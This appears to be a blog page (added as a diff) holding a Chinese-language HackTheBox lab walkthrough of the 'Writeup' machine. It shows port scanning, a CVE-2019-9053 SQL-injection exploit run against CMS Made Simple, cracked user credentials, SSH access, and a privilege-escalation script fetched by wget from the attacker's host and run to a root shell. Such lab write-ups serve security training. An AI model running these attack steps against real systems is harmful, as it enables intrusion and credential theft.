@@ -1,0 +1,667 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="12345678910111213141516171819202122232425262728Crazy:~&#x2F;HackThebox&#x2F;Writeup$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.138[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Writeup">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Writeup/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="12345678910111213141516171819202122232425262728Crazy:~&#x2F;HackThebox&#x2F;Writeup$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.138[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/Writeup.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220822092101614.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220822092221818.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.869Z">
+<meta property="article:modified_time" content="2022-08-22T07:36:10.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/Writeup.png">
+  
+  
+  
+  <title>HackTheBox-Writeup - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://www.worldisend.com/img/Writeup.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/Writeup$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.138<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-22 01:11:31 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.10.138                                    <br>Discovered open port 80/tcp on 10.10.10.138   <br>Crazy:~/HackThebox/Writeup$ sudo nmap -sC -sV 10.10.10.138 -p22,80 -oN Writeup                             <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.138<br>Host is up (0.20s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 dd5310700bd0470ae27e4ab6429823c7 (RSA)<br>|   256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA)<br>|_  256 93eaa84042c1a83385b35600621ca0ab (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/writeup/<br>|_http-title: Nothing here yet.<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.77 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.138 -p22,80 -oN Writeup<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220822092101614.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220822092101614"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/Writeup$ curl http://10.10.10.138/robots.txt<br><span class="hljs-comment">#              __</span><br><span class="hljs-comment">#      _(\    |@@|</span><br><span class="hljs-comment">#     (__/\__ \--/ __</span><br><span class="hljs-comment">#        \___|----|  |   __</span><br><span class="hljs-comment">#            \ &#125;&#123; /\ )_ / _\</span><br><span class="hljs-comment">#            /\__/\ \__O (__</span><br><span class="hljs-comment">#           (--/\--)    \__/</span><br><span class="hljs-comment">#           _)(  )(_</span><br><span class="hljs-comment">#          `---&#x27;&#x27;---`</span><br><br><span class="hljs-comment"># Disallow access to the blog until content is finished.</span><br>User-agent: * <br>Disallow: /writeup/<br>                                                                                                                                        <br>Crazy:~/HackThebox/Writeup$ <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220822092221818.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220822092221818"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/Writeup$ whatweb http://10.10.10.138/writeup/     <br>http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]<br></code></pre></td></tr></table></figure>
+
+<p>没有更多的版本信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/Writeup$ searchsploit CMS Made Simple<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                    | php/remote/46627.rb<br>CMS Made Simple 0.10 - <span class="hljs-string">&#x27;index.php&#x27;</span> Cross-Site Scripting                                               | php/webapps/26298.txt<br>CMS Made Simple 0.10 - <span class="hljs-string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                               | php/webapps/26217.html<br>CMS Made Simple 1.0.2 - <span class="hljs-string">&#x27;SearchInput&#x27;</span> Cross-Site Scripting                                            | php/webapps/29272.txt<br>CMS Made Simple 1.0.5 - <span class="hljs-string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                | php/webapps/29941.txt<br>CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                               | php/webapps/32668.txt<br>CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                     | php/webapps/43889.txt<br>CMS Made Simple 1.2 - Remote Code Execution                                                           | php/webapps/4442.txt<br>CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                  | php/webapps/4810.txt<br>CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                      | php/webapps/5600.php<br>CMS Made Simple 1.4.1 - Local File Inclusion                                                          | php/webapps/7285.txt<br>CMS Made Simple 1.6.2 - Local File Disclosure                                                         | php/webapps/9407.txt<br>CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                   | php/webapps/33643.txt<br>CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                      | php/webapps/11424.txt<br>CMS Made Simple 1.7 - Cross-Site Request Forgery                                                      | php/webapps/12009.html<br>CMS Made Simple 1.8 - <span class="hljs-string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                         | php/webapps/34299.py<br>CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                               | php/webapps/34068.html<br>CMS Made Simple 2.1.6 - <span class="hljs-string">&#x27;cntnt01detailtemplate&#x27;</span> Server-Side Template Injection                        | php/webapps/48944.py<br>CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                      | php/webapps/41997.txt<br>CMS Made Simple 2.1.6 - Remote Code Execution                                                         | php/webapps/44192.txt<br>CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                        | php/webapps/48779.py<br>CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                          | php/webapps/48742.txt<br>CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                              | php/webapps/48851.txt<br>CMS Made Simple 2.2.15 - <span class="hljs-string">&#x27;title&#x27;</span> Cross-Site Scripting (XSS)                                           | php/webapps/49793.txt<br>CMS Made Simple 2.2.15 - RCE (Authenticated)                                                          | php/webapps/49345.txt<br>CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)              | php/webapps/49199.txt<br>CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                         | php/webapps/44976.py<br>CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                         | php/webapps/45793.py<br>CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                                       | php/webapps/39760.txt<br>CMS Made Simple &lt; 2.2.10 - SQL Injection                                                              | php/webapps/46635.py<br>CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                      | php/webapps/34300.py<br>CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                 | php/webapps/34298.py<br>CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                        | php/webapps/46546.py<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br> Paper Title                                                                                          |  Path<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>CMS Made Simple v2.2.13 - Paper                                                                       | docs/english/49947-cms-made-simp<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>                                                                                               <br></code></pre></td></tr></table></figure>
+
+<p>漏洞编号为CVE-2019-9053.自带的脚本是python2的，无法进行使用，Github上有一个python3版本的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/4nner/CVE-2019-9053/blob/master/exploit.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./exploit.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Salt <span class="hljs-keyword">for</span> password found: 5a599ef579066807<br>[+] Username found: jkr<br>[+] Email found: jkr@writeup.htb<br>[+] Password found: 62def4866937f08cc13bab43bb14e6f7<br>[+] Password cracked: raykayjay9<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/Writeup$ ssh jkr@writeup.htb                    <br>jkr@writeup.htb<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Devuan GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Aug 21 21:49:32 2022 from 10.10.16.5</span><br><span class="hljs-string">jkr@writeup:~$ sudo -l</span><br><span class="hljs-string">-bash: sudo: command not found</span><br><span class="hljs-string">jkr@writeup:~$ cat user.txt </span><br><span class="hljs-string">fe...................................</span><br><span class="hljs-string">jkr@writeup:~$ </span><br><span class="hljs-string">jkr@writeup:~$ wget http://10.10.16.3/pwk.py</span><br><span class="hljs-string">--2022-08-21 21:51:50--  http://10.10.16.3/pwk.py</span><br><span class="hljs-string">Connecting to 10.10.16.3:80... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 3448 (3.4K) [text/x-python]</span><br><span class="hljs-string">Saving to: ‘pwk.py’</span><br><span class="hljs-string"></span><br><span class="hljs-string">pwk.py                            100%[=============================================================&gt;]   3.37K  --.-KB/s    in 0.01s   </span><br><span class="hljs-string"></span><br><span class="hljs-string">2022-08-21 21:51:51 (236 KB/s) - ‘pwk.py’ saved [3448/3448]</span><br><span class="hljs-string"></span><br><span class="hljs-string">jkr@writeup:~$ ls</span><br><span class="hljs-string">pwk.py  sharedvuln  user.txt</span><br><span class="hljs-string">jkr@writeup:~$ python pwk.py </span><br><span class="hljs-string">  File &quot;pwk.py&quot;, line 43</span><br><span class="hljs-string">    cargv = (c_char_p * (len(argv) + 1))(*argv, None)</span><br><span class="hljs-string">SyntaxError: only named arguments may follow *expression</span><br><span class="hljs-string">jkr@writeup:~$ python3 pwk.py </span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev),1000(jkr)</span><br><span class="hljs-string"># cat /root/root.txt</span><br><span class="hljs-string">bf84..............................</span><br><span class="hljs-string"># </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Writeup</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Travel/" title="HackTheBox-Travel">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Travel</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-RazorBlack/" title="TryHackMe-RazorBlack">
+                        <span class="hidden-mobile">TryHackMe-RazorBlack</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
